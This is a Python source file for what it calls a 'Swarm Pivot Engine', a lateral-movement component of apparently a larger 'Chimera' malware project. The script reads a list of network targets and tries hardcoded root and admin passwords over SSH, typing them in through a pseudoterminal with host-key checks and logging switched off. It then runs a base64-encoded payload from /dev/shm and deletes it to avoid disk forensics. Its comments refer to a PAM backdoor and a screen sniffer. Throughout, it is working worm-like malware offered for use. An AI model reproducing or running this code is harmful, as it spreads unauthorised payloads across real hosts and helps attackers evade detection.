#!/home/dan/Chimera_Project/venv/bin/python3
import os
import pty
import sys
import time
import select
import base64

class LateralReplicator:
    """
    Agent 502: Swarm Pivot Engine.
    Reads topology data, utilizes kernel PTY to automate native SSH, 
    and filelessly injects the Chimera Core into remote hosts.
    """
    def __init__(self, payload_path):
        self.topology_file = "/tmp/.swarm_topology"
        self.payload_path = payload_path
        # If Agent 427 (PAM Backdoor) is active on the network, we use the Master Key.
        # Otherwise, this list is populated by Agent 424 (Screen Sniffer).
        self.creds = [("root", "Chimera_Alpha_99"), ("admin", "password123")]

    def get_targets(self):
        """Actionable: Parse the raw ARP topology."""
        targets = []
        if not os.path.exists(self.topology_file):
            return targets
        
        with open(self.topology_file, "r") as f:
            for line in f:
                if "," in line:
                    ip = line.split(",")[0].strip()
                    targets.append(ip)
        return targets

    def get_fileless_command(self):
        """Wraps the payload in a base64 string for memory-only execution."""
        with open(self.payload_path, "rb") as f:
            raw_bytes = f.read()
        
        b64_payload = base64.b64encode(raw_bytes).decode('utf-8')
        
        # The Remote Execution Wrapper:
        # Decodes the payload and runs it directly from /dev/shm (RAM disk)
        # and unlinks it immediately to prevent disk forensics.
        remote_cmd = (
            f"echo '{b64_payload}' | base64 -d > /dev/shm/.kthread; "
            f"chmod +x /dev/shm/.kthread; "
            f"/dev/shm/.kthread & "
            f"rm -f /dev/shm/.kthread"
        )
        return remote_cmd

    def _pty_ssh_inject(self, target_ip, username, password, command):
        """
        Military Grade: UNIX Pseudoterminal Hijacking.
        Tricks the native SSH binary into accepting automated input.
        """
        print(f"[*] Attempting PTY Injection: {username}@{target_ip}...")
        
        # Fork a kernel-level terminal
        pid, fd = pty.fork()

        if pid == 0:
            # Child Process: Replaces itself with the SSH binary
            # We disable StrictHostKeyChecking to bypass the "Are you sure?" prompt
            ssh_args = [
                '/usr/bin/ssh', 
                '-o', 'StrictHostKeyChecking=no', 
                '-o', 'UserKnownHostsFile=/dev/null',
                '-o', 'LogLevel=QUIET',
                f'{username}@{target_ip}', 
                command
            ]
            os.execv('/usr/bin/ssh', ssh_args)
        else:
            # Parent Process: Controls the SSH session
            output = b""
            while True:
                # Wait for the terminal to request input or return data
                reads, _, _ = select.select([fd], [], [], 5.0)
                if not reads:
                    break # Timeout
                
                try:
                    data = os.read(fd, 1024)
                    output += data
                except OSError:
                    break

                # If the terminal asks for a password, we inject it via the FD
                if b"password:" in data.lower():
                    os.write(fd, (password + "\n").encode())
                    time.sleep(1) # Allow auth to process
                    
            os.waitpid(pid, 0)
            
            if b"Permission denied" in output:
                return False
            return True

    def ignite_swarm(self):
        print("--- [AGENT 502: LATERAL REPLICATION SEQUENCE] ---")
        targets = self.get_targets()
        
        if not targets:
            print("[!] Topology map empty. Run Agent 501 first.")
            return

        command = self.get_fileless_command()

        for target in targets:
            print(f"[*] Pivot Target Locked: {target}")
            infected = False
            
            for user, password in self.creds:
                success = self._pty_ssh_inject(target, user, password, command)
                if success:
                    print(f"[\033[92mSWARM EXPANDED\033[0m] Payload ignited on {target} via {user}")
                    infected = True
                    break
            
            if not infected:
                print(f"[\033[91mFAILED\033[0m] Exhausted credential pool for {target}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: ./main.py <path_to_agent_420_packed_payload>")
        sys.exit(1)
    
    LateralReplicator(sys.argv[1]).ignite_swarm()
